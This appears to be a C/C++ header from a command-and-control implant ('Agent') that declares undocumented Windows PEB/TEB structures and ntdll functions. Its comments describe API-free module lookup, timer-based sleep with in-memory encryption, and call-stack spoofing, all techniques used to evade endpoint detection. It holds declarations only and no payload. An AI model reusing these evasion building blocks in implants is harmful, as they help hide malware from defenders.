#ifndef NATIVE_H
#define NATIVE_H

#include <windows.h>
#include <stdint.h>

#ifndef NT_SUCCESS
typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// UNICODE_STRING - Windows wide string with explicit length
#ifndef _UNICODE_STRING_DEFINED
#define _UNICODE_STRING_DEFINED
typedef struct _UNICODE_STRING
{
    USHORT Length;          // length in bytes (not characters)
    USHORT MaximumLength;
    PWSTR  Buffer;          // wchar_t* to the string data
} UNICODE_STRING, *PUNICODE_STRING;
#endif

// one entry in the PEB module list - represents one loaded DLL
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY  InLoadOrderLinks;       // linked list node - MUST be first field
    LIST_ENTRY  InMemoryOrderLinks;
    LIST_ENTRY  InInitializationOrderLinks;
    PVOID       DllBase;                // base address of this DLL in memory
    PVOID       EntryPoint;
    ULONG       SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;         // just the filename e.g. L"ntdll.dll"
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

// the loader data block - contains the three module lists
typedef struct _PEB_LDR_DATA {
    ULONG       Length;
    BOOL        Initialized;
    PVOID       SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;      // ← walk this one
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

// the Process Environment Block - one per process
typedef struct _PAIN_PEB {
    BYTE            Reserved1[2];
    BYTE            BeingDebugged;      // offset 0x02 - set to 1 if debugger attached
    BYTE            Reserved2[1];
    PVOID           Reserved3[2];
    PEB_LDR_DATA*   Ldr;                // offset 0x18 - pointer to module list
    PVOID           ProcessParameters;
    PVOID           Reserved4[3];
    PVOID           AtlThunkSListPtr;
    PVOID           Reserved5;
    ULONG           Reserved6;
    PVOID           Reserved7;
    ULONG           Reserved8;
    ULONG           AtlThunkSListPtr32;
    PVOID           Reserved9[16];              // 16×8 = 128 bytes → lands at +0x0e8
    ULONG           NumberOfHeaps;              // +0x0e8 - current count of heaps
    ULONG           MaximumNumberOfHeaps;       // +0x0ec
    PVOID*          ProcessHeaps;               // +0x0f0 - array of all heap handles
} PAIN_PEB;

// CLIENT_ID holds process and thread IDs
typedef struct _CLIENT_ID {
    PVOID UniqueProcess;   // process ID
    PVOID UniqueThread;    // thread ID
} CLIENT_ID;

// minimal TEB - only the fields we need
typedef struct _TEB {
    BYTE        Reserved1[0x28];        // NT_TIB fields before ArbitraryUserPointer
    PVOID       ArbitraryUserPointer;   // +0x28: unused by Windows, holds our Agent*
    BYTE        Reserved2[0x10];        // +0x30..+0x3F (Self + EnvironmentPointer)
    CLIENT_ID   ClientId;               // +0x40: PID and TID
} TEB, *PTEB;

// read TEB pointer from gs:[0x30] - always valid
#define NtCurrentTeb() ( (PTEB)(__readgsqword(0x30)) )


typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE    Reserved1[16];
    PVOID   Reserved2[10];
    UNICODE_STRING ImagePathName;   // full path to the .exe
    UNICODE_STRING CommandLine;     // the command line string
} RTL_USER_PROCESS_PARAMETERS;


// read PEB pointer from gs:[0x60] - always valid, no API needed
#define NtCurrentPeb() ( (PAIN_PEB*)(__readgsqword(0x60)) )

// NT heap functions - not declared in windows.h
extern "C" PVOID    NTAPI RtlCreateHeap( ULONG Flags, PVOID HeapBase, SIZE_T ReserveSize, SIZE_T CommitSize, PVOID Lock, PVOID Parameters );
extern "C" PVOID    NTAPI RtlAllocateHeap( PVOID HeapHandle, ULONG Flags, SIZE_T Size );
extern "C" PVOID    NTAPI RtlReAllocateHeap( PVOID HeapHandle, ULONG Flags, PVOID MemoryPointer, SIZE_T Size );
extern "C" BOOLEAN  NTAPI RtlFreeHeap( PVOID HeapHandle, ULONG Flags, PVOID MemoryPointer );

// NT virtual memory functions
extern "C" NTSTATUS NTAPI NtAllocateVirtualMemory( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect );
extern "C" NTSTATUS NTAPI NtFreeVirtualMemory( HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType );
extern "C" NTSTATUS NTAPI NtProtectVirtualMemory( HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect );
extern "C" NTSTATUS NTAPI NtQueryVirtualMemory( HANDLE ProcessHandle, PVOID BaseAddress, ULONG MemoryInformationClass, PVOID Buffer, SIZE_T Length, PSIZE_T ResultLength );

// debug output
extern "C" ULONG    NTAPI DbgPrint( PCSTR Format, ... );

// RtlGetVersion - always returns correct OS version, even on Windows 10/11
// GetVersionExA is deprecated and returns wrong data since Win8.1 compatibility shims
extern "C" NTSTATUS NTAPI RtlGetVersion( PRTL_OSVERSIONINFOW lpVersionInformation );

extern "C" NTSTATUS NTAPI NtCreateEvent( PHANDLE EventHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes, ULONG EventType, BOOLEAN InitialState );
extern "C" NTSTATUS NTAPI NtWaitForSingleObject( HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout );
extern "C" NTSTATUS NTAPI NtSetEvent( HANDLE EventHandle, PULONG PreviousState );
extern "C" NTSTATUS NTAPI RtlCreateTimerQueueTimer( PHANDLE phNewTimer, HANDLE TimerQueue, PVOID Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags );
extern "C" NTSTATUS NTAPI RtlDeleteTimerQueueTimer( HANDLE TimerQueue, HANDLE Timer, HANDLE CompletionEvent );
// timer chain APIs (undocumented ntdll, not in SDK headers)
extern "C" NTSTATUS NTAPI RtlCreateTimerQueue( PHANDLE TimerQueue );
extern "C" NTSTATUS NTAPI RtlCreateTimer( HANDLE TimerQueue, PHANDLE Timer, PVOID Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags );
extern "C" NTSTATUS NTAPI RtlDeleteTimer( HANDLE TimerQueue, HANDLE Timer, HANDLE CompletionEvent );
extern "C" NTSTATUS NTAPI RtlDeleteTimerQueue( HANDLE TimerQueue );
// RtlCaptureContext already in winnt.h - no redeclaration needed
extern "C" NTSTATUS NTAPI NtSignalAndWaitForSingleObject( HANDLE SignalHandle, HANDLE WaitHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout );
extern "C" NTSTATUS NTAPI NtContinue( PCONTEXT ContextRecord, BOOLEAN TestAlert );
extern "C" NTSTATUS NTAPI NtClose( HANDLE Handle );
// WaitForSingleObjectEx and SetEvent already in synchapi.h - no redeclaration needed
// cryptbase.dll - in-process memory encryption (no caller key needed)
extern "C" NTSTATUS NTAPI SystemFunction040( PVOID pBuffer, ULONG cbBuffer, ULONG dwFlags );
extern "C" NTSTATUS NTAPI SystemFunction041( PVOID pBuffer, ULONG cbBuffer, ULONG dwFlags );
// thread context manipulation (stack spoofing)
extern "C" NTSTATUS NTAPI NtGetContextThread( HANDLE ThreadHandle, PCONTEXT ThreadContext );
extern "C" NTSTATUS NTAPI NtSetContextThread( HANDLE ThreadHandle, PCONTEXT ThreadContext );

// live call-stack spoofing anchor functions - we only need their addresses
extern "C" void NTAPI  RtlUserThreadStart( PVOID Function, PVOID Parameter );
extern "C" void WINAPI BaseThreadInitThunk( ULONG Flags, PVOID Function, PVOID Parameter );
// RtlLookupFunctionEntry is already declared in winnt.h (PRUNTIME_FUNCTION return),
// so no redeclaration here - DECLAPI(RtlLookupFunctionEntry) picks it up from winnt.h.

#endif // NATIVE_H